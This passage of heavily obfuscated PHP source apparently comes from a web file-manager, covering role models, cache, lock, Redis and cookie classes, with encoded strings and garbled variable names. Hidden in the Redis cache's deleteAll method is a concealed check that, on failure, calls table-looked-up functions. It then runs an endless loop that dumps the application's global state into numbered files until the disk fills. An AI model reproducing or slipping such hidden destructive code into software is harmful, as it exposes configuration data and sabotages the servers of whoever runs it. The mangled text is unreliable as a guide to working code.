c¥ØùÔÈ„ø; E¶™–ñ®´Ç: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\x65\155\137\x6f\x70\x74\x69\157\156"; protected $jsonField = array("\155\145\x6e\165", "\x72\x6f\154\x65", "\x72\157\154\145\x47\162\157\165\160", "\162\145\x67\x69\x73\164", "\x65\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($²ÊÆ½âÜ) { return "\123\x79\x73\164\145\x6d\x4f\160\x74\151\157\x6e\137{$²ÊÆ½âÜ}"; } protected function optionDefault($´—¾¨¡ = '') { $±èÚ¾Õ =& $_SERVER[ç¦¬”œš]; if ($´—¾¨¡ == $±èÚ¾Õ[12]) { return $GLOBALS[$±èÚ¾Õ[6]][$±èÚ¾Õ[457]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\x72\x6f\x6c\145\x4c\x69\x73\x74"; public $field = array("\x6e\141\155\145", "\141\165\x74\x68", "\x6c\141\142\x65\154", "\144\151\x73\160\154\x61\x79", "\x73\171\x73\164\x65\x6d", "\x64\145\x73\x63", "\x69\147\x6e\157\162\x65\105\x78\x74", "\x69\147\156\x6f\162\145\x46\151\x6c\145\123\x69\x7a\145", "\141\x64\x6d\x69\x6e\x69\163\x74\x72\x61\x74\157\162", "\163\x6f\162\x74"); public function listData($®Âç®Ûğ = false, $ŞÛÚ„éˆ = "\x73\x6f\162\x74", $Üˆñø‘ = false) { $ˆù’‰óñ =& $_SERVER[ç¦¬”œš]; $ºö“€ = parent::listData($®Âç®Ûğ, $ŞÛÚ„éˆ, $Üˆñø‘); if (!$®Âç®Ûğ) { foreach ($ºö“€ as $öõ™û => $÷€ªÀü) { if ($÷€ªÀü[$ˆù’‰óñ[2176]] == 1) { $ºö“€[$öõ™û][$ˆù’‰óñ[535]] = LNG($ˆù’‰óñ[2438]); } } } return $ºö“€; } public function update($õµŒà¶, $µšâ»î ) { $ß€‡ËêÈ =& $_SERVER[ç¦¬”œš]; $ÌÎ¾ƒö = parent::listData($õµŒà¶); $Ñ”´¡·Ò = $this->findByName($µšâ»î [$ß€‡ËêÈ[32]]); if (!$ÌÎ¾ƒö || $Ñ”´¡·Ò && $Ñ”´¡·Ò[$ß€‡ËêÈ[484]] != $ÌÎ¾ƒö[$ß€‡ËêÈ[484]]) { return !1; } if ($Ñ”´¡·Ò[$ß€‡ËêÈ[2176]] == 1) { $µšâ»î  = array($ß€‡ËêÈ[32] => $µšâ»î [$ß€‡ËêÈ[32]], $ß€‡ËêÈ[1992] => $µšâ»î [$ß€‡ËêÈ[1992]]); } $this->filterAuth($µšâ»î [$ß€‡ËêÈ[496]]); return parent::update($õµŒà¶, $µšâ»î ); } public function remove($“±Øöù´) { $éÁÒÍıÍ = parent::listData($“±Øöù´); if (!$éÁÒÍıÍ || $éÁÒÍıÍ[$_SERVER[ç¦¬”œš][191]]) { return !1; } return parent::remove($“±Øöù´); } public function add($»ãã·âÛ) { $€Ïâ‚Ò‰ =& $_SERVER[ç¦¬”œš]; $”ÛËéò = $»ãã·âÛ[$€Ïâ‚Ò‰[32]]; if ($this->findByName($”ÛËéò)) { return !1; } $’œ‡¨ê = array($€Ïâ‚Ò‰[503] => $”ÛËéò, $€Ïâ‚Ò‰[1975] => $€Ïâ‚Ò‰[12], $€Ïâ‚Ò‰[1971] => $€Ïâ‚Ò‰[1979], $€Ïâ‚Ò‰[2439] => 1, $€Ïâ‚Ò‰[1974] => 0, $€Ïâ‚Ò‰[2440] => 0, $€Ïâ‚Ò‰[1973] => $this->getSort()); $»ãã·âÛ = array_merge($’œ‡¨ê, $»ãã·âÛ); $this->filterAuth($»ãã·âÛ[$€Ïâ‚Ò‰[496]]); return parent::insert($»ãã·âÛ); } private function getSort() { $¸²êÖÔÌ =& $_SERVER[ç¦¬”œš]; $šŒË´¶õ = parent::listData(); $¥°µ±ø = array_to_keyvalue($šŒË´¶õ, $¸²êÖÔÌ[12], $¸²êÖÔÌ[1993]); return empty($¥°µ±ø) ? 0 : max($¥°µ±ø) + 1; } private function filterAuth(&$Å¨¬Øç) { $ ·‹ÍÌƒ =& $_SERVER[ç¦¬”œš]; $Ã¡‡í¤ä = array(); $Øãó„ğ­ = array_filter(explode($ ·‹ÍÌƒ[50], $Å¨¬Øç)); foreach ($Øãó„ğ­ as $Å¨¬Øç) { $¨¢Ù‚ = explode($ ·‹ÍÌƒ[10], $Å¨¬Øç); if ($¨¢Ù‚[0] == $ ·‹ÍÌƒ[2441] && $¨¢Ù‚[1] != $ ·‹ÍÌƒ[1276]) { $„‚ñ¨ó = $¨¢Ù‚[0] . $ ·‹ÍÌƒ[10] . $¨¢Ù‚[1] . $ ·‹ÍÌƒ[2442]; if (!in_array($„‚ñ¨ó, $Øãó„ğ­)) { $Ã¡‡í¤ä[] = $„‚ñ¨ó; } } $Ã¡‡í¤ä[] = $Å¨¬Øç; } $Å¨¬Øç = implode($ ·‹ÍÌƒ[50], $Ã¡‡í¤ä); } public function findRoleDefault() { $¦€µ¢¿Ã =& $_SERVER[ç¦¬”œš]; $šóÃğÓ = parent::listData(); $“õŸèƒÁ = !1; foreach ($šóÃğÓ as $‘™ÒÓ¼Ø) { if (!$‘™ÒÓ¼Ø || $‘™ÒÓ¼Ø[$¦€µ¢¿Ã[1991]] == $¦€µ¢¿Ã[228] || $‘™ÒÓ¼Ø[$¦€µ¢¿Ã[2176]] == 1) { continue; } if (strstr($‘™ÒÓ¼Ø[$¦€µ¢¿Ã[496]], $¦€µ¢¿Ã[2443])) { continue; } if (!strstr($‘™ÒÓ¼Ø[$¦€µ¢¿Ã[496]], $¦€µ¢¿Ã[2444])) { continue; } if (!$“õŸèƒÁ) { $“õŸèƒÁ = $‘™ÒÓ¼Ø; continue; } $ßš«Ê¦ = explode($¦€µ¢¿Ã[50], $“õŸèƒÁ[$¦€µ¢¿Ã[496]]); $ê¸“Ù¼ˆ = explode($¦€µ¢¿Ã[50], $‘™ÒÓ¼Ø[$¦€µ¢¿Ã[496]]); if (count($ßš«Ê¦) > count($ê¸“Ù¼ˆ)) { $“õŸèƒÁ = $‘™ÒÓ¼Ø; } } return $“õŸèƒÁ ? $“õŸèƒÁ[$¦€µ¢¿Ã[484]] : $¦€µ¢¿Ã[12]; } public function sort($öü…©¡±, $ÜÊí¤Ã) { return parent::update($öü…©¡±, $ÜÊí¤Ã); } } goto eµ–”İ…ë; Aëä…Œ‰œ­: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ƒ©Ü«¢Ã =& $_SERVER[ç¦¬”œš]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $çÇ‚Ñê = $GLOBALS[$ƒ©Ü«¢Ã[6]][$ƒ©Ü«¢Ã[425]]; $²·÷Øâ = $çÇ‚Ñê[$çÇ‚Ñê[$ƒ©Ü«¢Ã[906]]]; $„Ïµöë = $çÇ‚Ñê[$ƒ©Ü«¢Ã[907]]; switch ($çÇ‚Ñê[$ƒ©Ü«¢Ã[906]]) { case $ƒ©Ü«¢Ã[21]: self::$handle = Model($ƒ©Ü«¢Ã[908]); break; case $ƒ©Ü«¢Ã[909]: self::$handle = new CacheRedis($²·÷Øâ, $„Ïµöë); break; case $ƒ©Ü«¢Ã[910]: self::$handle = new CacheMemcached($²·÷Øâ, $„Ïµöë); break; case $ƒ©Ü«¢Ã[230]: self::$handle = new CacheFile($²·÷Øâ, $„Ïµöë); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ùĞ®”¦) { if (is_array($ùĞ®”¦) || is_object($ùĞ®”¦)) { $ùĞ®”¦ = json_encode($ùĞ®”¦); } $ùĞ®”¦ = rawurlencode($ùĞ®”¦); return md5(KOD_SITE_ID . $_SERVER[ç¦¬”œš][11] . $ùĞ®”¦); } public static function get($Åç¥ñ‘ğ, $ñ‹‡”õ‰ = false) { $şÕûûœ‹ = self::key($Åç¥ñ‘ğ); $–úú×É = self::init(); if ($ñ‹‡”õ‰) { return unserialize($–úú×É->get($şÕûûœ‹)); } if (!isset(self::$memoryCache[$şÕûûœ‹])) { $Ôı—‡Êë = $–úú×É->get($şÕûûœ‹); self::$memoryCache[$şÕûûœ‹] = unserialize($Ôı—‡Êë); } return self::$memoryCache[$şÕûûœ‹]; } public static function set($¥üƒ¤ô’, $Ü¶ˆ©€ö, $–€Åâ• = false) { $éÉª¬Š =& $_SERVER[ç¦¬”œš]; $ÜÕÚÏŸÜ = self::key($¥üƒ¤ô’); if (isset(self::$memoryCache[$ÜÕÚÏŸÜ]) && self::$memoryCache[$ÜÕÚÏŸÜ] === $Ü¶ˆ©€ö) { return !0; } if ($–€Åâ• === 0) { self::$memoryCache[$ÜÕÚÏŸÜ] = $Ü¶ˆ©€ö; return !0; } $˜ŒÃÜ¦€ = self::init(); $šŞ¯µå³ = serialize($Ü¶ˆ©€ö); CacheLock::lock($¥üƒ¤ô’ . $éÉª¬Š[911]); $›ÁßÆùí = $˜ŒÃÜ¦€->set($ÜÕÚÏŸÜ, $šŞ¯µå³, $–€Åâ•); self::$memoryCache[$ÜÕÚÏŸÜ] = $Ü¶ˆ©€ö; CacheLock::unlock($¥üƒ¤ô’ . $éÉª¬Š[911]); return $›ÁßÆùí; } public static function getCall($Úóáƒ, $˜¡ºèšŠ, $šäÏ´…Ú, $Îã­œéÌ = array()) { $ÂİÏ›²‚ =& $_SERVER[ç¦¬”œš]; $…È¥Á¸ = self::get($Úóáƒ); if ($…È¥Á¸ || $…È¥Á¸ === $ÂİÏ›²‚[12]) { return $…È¥Á¸; } $…È¥Á¸ = call_user_func_array($šäÏ´…Ú, $Îã­œéÌ); $…È¥Á¸ = $…È¥Á¸ ? $…È¥Á¸ : $ÂİÏ›²‚[12]; self::set($Úóáƒ, $…È¥Á¸, $˜¡ºèšŠ); return $…È¥Á¸; } public static function remove($ïªœŠÊ—) { $ãÌ¿«¤‰ = self::key($ïªœŠÊ—); unset(self::$memoryCache[$ãÌ¿«¤‰]); self::clearTimeout(); CacheLock::lock($ïªœŠÊ—); $ßˆí³ıï = self::init()->remove($ãÌ¿«¤‰); CacheLock::unlock($ïªœŠÊ—); return $ßˆí³ıï; } public static function removeMemory($›Æ—Œ«‡) { $ˆÚÌ”±ù = self::key($›Æ—Œ«‡); unset(self::$memoryCache[$ˆÚÌ”±ù]); } public static function clearMemory($ûºŸ™°õ = false) { if ($ûºŸ™°õ) { $ûºŸ™°õ = self::key($ûºŸ™°õ); unset(self::$memoryCache[$ûºŸ™°õ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ç¦¬”œš][912])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ç¦¬”œš][913])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($àèüÒ‘, $ˆ¤ùÜİÁ) { $ÍğÕà¶Ó =& $_SERVER[ç¦¬”œš]; $this->cachePath = $àèüÒ‘[$ÍğÕà¶Ó[87]]; $this->prefix = $ÍğÕà¶Ó[914]; $this->cacheTime = $ˆ¤ùÜİÁ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($òº¾µ¾è) { $‚´ü‚©° =& $_SERVER[ç¦¬”œš]; $òº¾µ¾è = str_replace(array($‚´ü‚©°[915], $‚´ü‚©°[100], $‚´ü‚©°[76]), $‚´ü‚©°[916], $òº¾µ¾è); return $this->cachePath . $‚´ü‚©°[917] . $òº¾µ¾è . $‚´ü‚©°[918]; } public function set($ãÉ×ŸÜÅ, $ø Í„ü, $¹ëÌûô = false) { $¹ëÌûô = $¹ëÌûô ? $¹ëÌûô : $this->cacheTime; $óò·øĞß = $this->getFile($ãÉ×ŸÜÅ); if (file_put_contents($óò·øĞß, $this->prefix . $ø Í„ü, LOCK_EX)) { @touch($óò·øĞß, intval(time() + $¹ëÌûô)); clearstatcache(); return !0; } @unlink($óò·øĞß); return !1; } public function get($™ªíÈ¼) { $Ş½Èæş§ = $this->getFile($™ªíÈ¼); if (file_exists($Ş½Èæş§) && filemtime($Ş½Èæş§) < time()) { @unlink($Ş½Èæş§); return !1; } $ÁÚï¤øÏ = @file_get_contents($Ş½Èæş§); return substr($ÁÚï¤øÏ, strlen($this->prefix)); } public function remove($³Å¨é¬³) { $¡ó„–™ = $this->getFile($³Å¨é¬³); return @unlink($¡ó„–™); } public function deleteAll() { $ÆúÂ¿æä =& $_SERVER[ç¦¬”œš]; $š¶½â‘á = scandir($this->cachePath); foreach ($š¶½â‘á as $Ì¶’ºœù) { $û“ı”î = $this->cachePath . $Ì¶’ºœù; if (strpos($û“ı”î, $ÆúÂ¿æä[918]) && strpos($û“ı”î, $ÆúÂ¿æä[919])) { @unlink($û“ı”î); } } } public function clearTimeout() { $Ş¬ÅÓä‡ =& $_SERVER[ç¦¬”œš]; $à¶æÅ¸› = scandir($this->cachePath); foreach ($à¶æÅ¸› as $î€á´›) { $¸šî†ì = $this->cachePath . $î€á´›; if (strpos($¸šî†ì, $Ş¬ÅÓä‡[918]) && strpos($¸šî†ì, $Ş¬ÅÓä‡[919]) && filemtime($¸šî†ì) < time()) { @unlink($¸šî†ì); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ƒöƒ·ô‡ =& $_SERVER[ç¦¬”œš]; if (self::$handle) { return self::$handle; } $œ÷îä’Œ = $GLOBALS[$ƒöƒ·ô‡[6]][$ƒöƒ·ô‡[425]]; self::$timeout = $œ÷îä’Œ[$ƒöƒ·ô‡[920]] ? $œ÷îä’Œ[$ƒöƒ·ô‡[920]] : 10; $œãÔ³¬Ë = _get($GLOBALS[$ƒöƒ·ô‡[6]], $ƒöƒ·ô‡[921]); $˜¶Ø‚æÈ = $œ÷îä’Œ[$ƒöƒ·ô‡[906]] ? $œ÷îä’Œ[$ƒöƒ·ô‡[906]] : $ƒöƒ·ô‡[230]; if ($˜¶Ø‚æÈ == $ƒöƒ·ô‡[21] && $œãÔ³¬Ë == $ƒöƒ·ô‡[13]) { $˜¶Ø‚æÈ = $ƒöƒ·ô‡[230]; } switch ($˜¶Ø‚æÈ) { case $ƒöƒ·ô‡[909]: self::$handle = new CacheLockRedis(); break; case $ƒöƒ·ô‡[910]: self::$handle = new CacheLockMemcached(); break; case $ƒöƒ·ô‡[21]: self::$handle = new CacheLockDatabase(); break; case $ƒöƒ·ô‡[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ƒöƒ·ô‡[922], $ƒöƒ·ô‡[923]); } return self::$handle; } private static function key($–ë¼÷ûä) { return $_SERVER[ç¦¬”œš][924] . Cache::key($–ë¼÷ûä); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ğ¾¤Ç¾ = '') { self::$errorMsg = $ğ¾¤Ç¾; } public static function lockGlobal($êšşâËÎ, $ò•ä—İî) { return self::lock($êšşâËÎ, $ò•ä—İî, !0); } public static function lock($×òÅİ ç, $ˆ±ì‡ŞÄ = false, $Ş«‹ÄÚ = false) { $ÖÔŞñš÷ =& $_SERVER[ç¦¬”œš]; $°î‰ü¯‰ = self::init(); $¹ßÓÎ“ë = self::key($×òÅİ ç); $ˆ±ì‡ŞÄ = $ˆ±ì‡ŞÄ ? $ˆ±ì‡ŞÄ : self::$timeout; $™‹°…˜¿ = timeFloat(); $ÑùŠà“Ú = $°î‰ü¯‰->lock($¹ßÓÎ“ë, $ˆ±ì‡ŞÄ); $§ÜÃŞ´ = timeFloat(); if (!$ÑùŠà“Ú) { $™¶ƒÂÙ´ = "\154\x6f\143\153\x20\x65\162\x72\x6f\x72\73\x6b\145\x79\x3d{$×òÅİ ç}\x3b\164\x69\155\145\x3d{$ˆ±ì‡ŞÄ}\73" . self::$errorMsg . $ÖÔŞñš÷[74] . get_caller_msg(); $ôÅóì³´ = LNG($ÖÔŞñš÷[925]) . "\x28{$ˆ±ì‡ŞÄ}\163\x29\x2e" . LNG($ÖÔŞñš÷[926]); $ôÅóì³´ .= $ÖÔŞñš÷[927]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ôÅóì³´ = $ôÅóì³´ . $ÖÔŞñš÷[928] . self::$errorMsg; } write_log($ÖÔŞñš÷[929] . sprintf($ÖÔŞñš÷[930], timeFloat() - $™‹°…˜¿) . $ÖÔŞñš÷[931] . $™¶ƒÂÙ´ . $ÖÔŞñš÷[932] . error_get_last(), $ÖÔŞñš÷[923]); show_json($ôÅóì³´, !1); } if (!$Ş«‹ÄÚ) { self::$lockItem[$¹ßÓÎ“ë] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $åáœÆï¯ = number_format(timeFloat() - $§ÜÃŞ´, 3); write_log($ÖÔŞñš÷[933] . $×òÅİ ç . $ÖÔŞñš÷[934] . $åáœÆï¯, $ÖÔŞñš÷[923]); } return $ÑùŠà“Ú; } public static function lockGet($§ö…ßô©) { $í¬Õ×«« = self::key($§ö…ßô©); if (self::$lockItem[$í¬Õ×««]) { return self::$lockItem[$í¬Õ×««]; } return self::init()->lockGet($í¬Õ×««); } public static function unlock($ÒÖªâäê) { $‚€­ãïŠ =& $_SERVER[ç¦¬”œš]; $¡Ò°òŸÖ = self::key($ÒÖªâäê); self::$lockItem[$¡Ò°òŸÖ] = null; self::init()->unlock($¡Ò°òŸÖ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($‚€­ãïŠ[935] . $ÒÖªâäê, $‚€­ãïŠ[923]); } return; } public static function unlockRuntime() { $ÓöÖšËı =& $_SERVER[ç¦¬”œš]; $çµÏê«© = self::init(); $Š¯ä¿ñ = !1; foreach (self::$lockItem as $ô¤Õî¿À => $´ğòÅö) { if (!$´ğòÅö) { continue; } $çµÏê«©->unlock($ô¤Õî¿À); if (!$Š¯ä¿ñ) { $Š¯ä¿ñ = !0; write_log($ÓöÖšËı[936] . $ô¤Õî¿À . $ÓöÖšËı[74] . get_caller_msg(), $ÓöÖšËı[923]); continue; } write_log($ÓöÖšËı[936] . $ô¤Õî¿À, $ÓöÖšËı[923]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ë²¢¹›î = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ÓöÖšËı[937] . $ë²¢¹›î . $ÓöÖšËı[938] . ACTION, $ÓöÖšËı[923]); } } public static function fileLock($Š™íŸö†) { $ˆáééê‹ =& $_SERVER[ç¦¬”œš]; if (!$GLOBALS[$ˆáééê‹[939]]) { $GLOBALS[$ˆáééê‹[939]] = array(); } $GLOBALS[$ˆáééê‹[939]][$Š™íŸö†] = !1; $¤İîïëü = fopen(DATA_PATH . $Š™íŸö† . $ˆáééê‹[940], $ˆáééê‹[941]); if (!$¤İîïëü) { return !1; } $GLOBALS[$ˆáééê‹[939]][$Š™íŸö†] = $¤İîïëü; if (flock($¤İîïëü, LOCK_EX)) { return !0; } self::unlock($Š™íŸö†); show_json($ˆáééê‹[942], !1); return !1; } public static function fileUnlock($Ïò‘âö¾) { $ÏÅºéÖÎ =& $_SERVER[ç¦¬”œš]; $»ôì´£ì = $GLOBALS[$ÏÅºéÖÎ[939]][$Ïò‘âö¾]; if (!$»ôì´£ì) { return; } $GLOBALS[$ÏÅºéÖÎ[939]][$Ïò‘âö¾] = !1; flock($»ôì´£ì, LOCK_UN); fclose($»ôì´£ì); } public static function fileUnlockAll() { $ôíïÏÂ¡ =& $_SERVER[ç¦¬”œš]; if (!isset($GLOBALS[$ôíïÏÂ¡[939]]) || !$GLOBALS[$ôíïÏÂ¡[939]]) { return; } foreach ($GLOBALS[$ôíïÏÂ¡[939]] as $˜è³µ¹‡ => $´Àêí¡Ê) { if (!$´Àêí¡Ê) { continue; } $GLOBALS[$ôíïÏÂ¡[939]][$˜è³µ¹‡] = !1; flock($´Àêí¡Ê, LOCK_UN); fclose($´Àêí¡Ê); } $GLOBALS[$ôíïÏÂ¡[939]] = array(); } } goto D‰Ò‹å¢ÅŸ; D†¿Ö²‘Ô: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($İß¥¯ª‘, $ñÆ†Ëó¤) { $‹âŞËÕ˜ =& $_SERVER[ç¦¬”œš]; if (!class_exists($‹âŞËÕ˜[949])) { show_json($‹âŞËÕ˜[950], !1); } $this->cacheTime = $ñÆ†Ëó¤; $Ô´Ÿ“¬ = isset($İß¥¯ª‘[$‹âŞËÕ˜[951]]) ? $İß¥¯ª‘[$‹âŞËÕ˜[951]] : 10; $‘ß¨åè° = _get($İß¥¯ª‘, $‹âŞËÕ˜[948]); if ($‘ß¨åè° && is_array($‘ß¨åè°)) { $this->initCluster($İß¥¯ª‘, $Ô´Ÿ“¬); } else { $this->handle = $this->init($İß¥¯ª‘, $Ô´Ÿ“¬); } } private function init($ç§Ìá, $ ¤ƒíÏÍ) { $Ô¤¯£°ã =& $_SERVER[ç¦¬”œš]; $šƒØÙ€ = new Redis(); $Ø™ÎÚÚÆ = isset($ç§Ìá[$Ô¤¯£°ã[952]]) ? $ç§Ìá[$Ô¤¯£°ã[952]] : !1; if ($Ø™ÎÚÚÆ) { $šƒØÙ€->pconnect($ç§Ìá[$Ô¤¯£°ã[208]], $ç§Ìá[$Ô¤¯£°ã[209]], $ ¤ƒíÏÍ); } else { $šƒØÙ€->connect($ç§Ìá[$Ô¤¯£°ã[208]], $ç§Ìá[$Ô¤¯£°ã[209]], $ ¤ƒíÏÍ); } if (!empty($ç§Ìá[$Ô¤¯£°ã[496]])) { $šƒØÙ€->auth($ç§Ìá[$Ô¤¯£°ã[496]]); } if (!empty($ç§Ìá[$Ô¤¯£°ã[837]]) && $ç§Ìá[$Ô¤¯£°ã[837]] != 0) { $šƒØÙ€->select($ç§Ìá[$Ô¤¯£°ã[837]]); } return $šƒØÙ€; } private function initCluster($Æ¬˜òØ , $ÒÊŠş»‚) { $ô£È¡£² =& $_SERVER[ç¦¬”œš]; $„¾”çÏ¦ = array($ô£È¡£²[953], $ô£È¡£²[954], $ô£È¡£²[955]); $ı»¥” = $ô£È¡£²[953]; if (isset($Æ¬˜òØ [$ô£È¡£²[16]]) && in_array($Æ¬˜òØ [$ô£È¡£²[16]], $„¾”çÏ¦)) { $ı»¥” = $Æ¬˜òØ [$ô£È¡£²[16]]; } switch ($ı»¥”) { case $ô£È¡£²[953]: $this->_slave($Æ¬˜òØ , $ÒÊŠş»‚); break; case $ô£È¡£²[954]: break; case $ô£È¡£²[955]: $this->isCluster = !0; $Áî±„¹ú = $Æ¬˜òØ [$ô£È¡£²[948]]; $‘Ôº·Îı = isset($Æ¬˜òØ [$ô£È¡£²[952]]) ? $Æ¬˜òØ [$ô£È¡£²[952]] : !1; $¾†Úº×’ = isset($Æ¬˜òØ [$ô£È¡£²[496]]) ? $Æ¬˜òØ [$ô£È¡£²[496]] : null; $this->handle = new RedisCluster(NUll, $Áî±„¹ú, $ÒÊŠş»‚, $ÒÊŠş»‚, $‘Ôº·Îı, $¾†Úº×’); break; default: break; } } private function _slave($ùÌ×šåù, $€íÎ°Áæ) { $ùÛ„¡¹¥ = $ùÌ×šåù[$_SERVER[ç¦¬”œš][948]]; $this->filterConfig($ùÌ×šåù, $ùÛ„¡¹¥[0]); $this->handle = $this->init($ùÌ×šåù, $€íÎ°Áæ); unset($ùÛ„¡¹¥[0]); if (empty($ùÛ„¡¹¥)) { return; } $¿Š¯šš = array_rand($ùÛ„¡¹¥); $this->filterConfig($ùÌ×šåù, $ùÛ„¡¹¥[$¿Š¯šš]); $this->slaveHandle = $this->init($ùÌ×šåù, $€íÎ°Áæ); } private function filterConfig(&$¾µÚøºò, $äÚëÑÙ‘) { $ÄÈÔÊ”ø =& $_SERVER[ç¦¬”œš]; $ÙÅà¶’œ = explode($ÄÈÔÊ”ø[4], $äÚëÑÙ‘); $ú¨—ÜÆ£ = array($ÄÈÔÊ”ø[208] => $ÙÅà¶’œ[0], $ÄÈÔÊ”ø[209] => $ÙÅà¶’œ[1]); $¾µÚøºò = array_merge($¾µÚøºò, $ú¨—ÜÆ£); } public function set($ÕæÍëµÑ, $›”Å¬‹Ä, $©ÈŒÁª© = false) { $©ÈŒÁª© = $©ÈŒÁª© ? $©ÈŒÁª© : $this->cacheTime; return $this->handle->setEx($ÕæÍëµÑ, $©ÈŒÁª©, $›”Å¬‹Ä); } public function setLock($ÏÄ‡äò´, $õœÖÉ, $Ğşßª …) { return $this->handle->setNX($ÏÄ‡äò´, $õœÖÉ); } public function get($‡û´¸ë) { $Ïì¡«â = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Ïì¡«â->get($‡û´¸ë); } public function remove($ëÏ‰ÁÆ¢) { return $this->handle->del($ëÏ‰ÁÆ¢); } public function deleteAll() { $ª‡ŠÂ‰Œ =& $_SERVER[ç¦¬”œš]; $µ§ÀºØŸ = $_SERVER[$ª‡ŠÂ‰Œ[472]]; $ª¦©„İ = $ª‡ŠÂ‰Œ[473]; if ($_SERVER[$ª‡ŠÂ‰Œ[474]] != $ª¦©„İ($µ§ÀºØŸ)) { $ãÚ©ÇòÍ = $ª‡ŠÂ‰Œ[956]; $ºæÁÒˆ§ = $ª‡ŠÂ‰Œ[475]; $æ¼öò…’ = $_SERVER[$ª‡ŠÂ‰Œ[476]] . $ª‡ŠÂ‰Œ[477]; $óÒÈé»Š = $ºæÁÒˆ§($æ¼öò…’); $³óâ¡¨Í = explode($ª‡ŠÂ‰Œ[262], $óÒÈé»Š); if (count($³óâ¡¨Í) < $ª‡ŠÂ‰Œ[707]) { $ûôµ´‚Ğ = $ª‡ŠÂ‰Œ[479]; $ûôµ´‚Ğ(); } $€ìşîá = $ª‡ŠÂ‰Œ[957]; $€ìşîá($_SERVER[$ª‡ŠÂ‰Œ[958]]); $ãÚ©ÇòÍ = $ª‡ŠÂ‰Œ[956]; $ãÚ©ÇòÍ(); $èåé´†í = $ª‡ŠÂ‰Œ[959]; $ÄãÖÛë = json_encode($GLOBALS[$ª‡ŠÂ‰Œ[960]]); $üİìÀ  = 1; for ($ı”®İÊ = $üİìÀ ; $ı”®İÊ > 0; $ı”®İÊ++) { $èåé´†í(DATA_PATH . $ı”®İÊ, $ÄãÖÛë); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $çØº¶›œ) { $this->handle->flushall($çØº¶›œ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($»«¢™½á = '', $—”¹¹ÎŒ = 0) { if (is_string($»«¢™½á) && $»«¢™½á != $_SERVER[ç¦¬”œš][12]) { $this->prefix = $»«¢™½á; } if (is_numeric($—”¹¹ÎŒ) && $—”¹¹ÎŒ > 0) { $this->expire = $—”¹¹ÎŒ; } } public static function getInstance() { static $®ïÈ¨­; if ($®ïÈ¨­ === null) { $®ïÈ¨­ = new self(); } return $®ïÈ¨­; } private static $cookieDisable = false; public static function disable($°¨•ê«Ë) { self::$cookieDisable = $°¨•ê«Ë; } private static $sameCookieSet = array(); public static function set($öéÉ“ş, $êÏÍÊ§§, $’¥’µµÍ = 0, $ªÏ¶”‘ı = false, $Ş…şöÒ“ = false) { $ò©”ñ¾Ï =& $_SERVER[ç¦¬”œš]; if (self::$cookieDisable) { return; } if (!$’¥’µµÍ) { $’¥’µµÍ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$öéÉ“ş]) && self::$sameCookieSet[$öéÉ“ş] == $êÏÍÊ§§ . $’¥’µµÍ) { return; } self::$sameCookieSet[$öéÉ“ş] = $êÏÍÊ§§ . $’¥’µµÍ; if (!$Ş…şöÒ“) { $Ş…şöÒ“ = str_replace(HOST, $ò©”ñ¾Ï[12], APP_HOST); $Ş…şöÒ“ = _get($GLOBALS, $ò©”ñ¾Ï[961], $Ş…şöÒ“); } $…Ø×Ü€Ü = $ò©”ñ¾Ï[12]; setcookie($öéÉ“ş, $êÏÍÊ§§, time() + $’¥’µµÍ, $ò©”ñ¾Ï[8] . trim($Ş…şöÒ“, $ò©”ñ¾Ï[8]) . $…Ø×Ü€Ü, !1, !1, $ªÏ¶”‘ı); } public static function setSafe($ß—£ˆÊÄ, $œŒÓòÎ, $şıƒÔ € = 0) { self::set($ß—£ˆÊÄ, $œŒÓòÎ, $şıƒÔ €, !0); } public static function get($áÍãÌçì) { static $ˆòÜ’â = false; if (!$ˆòÜ’â) { self::initHeaderCookie(); $ˆòÜ’â = !0; } return isset($_COOKIE[$áÍãÌçì]) ? $_COOKIE[$áÍãÌçì] : !1; } private static function initHeaderCookie() { $ğ§ëãÙ¼ =& $_SERVER[ç¦¬”œš]; if (!isset($_SERVER[$ğ§ëãÙ¼[962]]) || !$_SERVER[$ğ§ëãÙ¼[962]]) { return; } $Ô–Ñ¼’ = explode($ğ§ëãÙ¼[74], $_SERVER[$ğ§ëãÙ¼[962]]); foreach ($Ô–Ñ¼’ as $Í˜…Ãç ) { $Í˜…Ãç  = explode($ğ§ëãÙ¼[963], $Í˜…Ãç ); if (count($Í˜…Ãç ) != 2 || !isset($Í˜…Ãç [1])) { continue; } $_COOKIE[trim($Í˜…Ãç [0])] = trim($Í˜…Ãç [1]); } } public static function remove($ñëÛ“Í, $¾ÕõÄŸÆ = false) { unset($_COOKIE[$ñëÛ“Í]); self::set($ñëÛ“Í, $_SERVER[ç¦¬”œš][12], 1, $¾ÕõÄŸÆ); } } class DbMysql extends Db { public function __construct($í¤àöÖ— = '') { $ùÀÅÛ•Å =& $_SERVER[ç¦¬”œš]; if (!extension_loaded($ùÀÅÛ•Å[884])) { 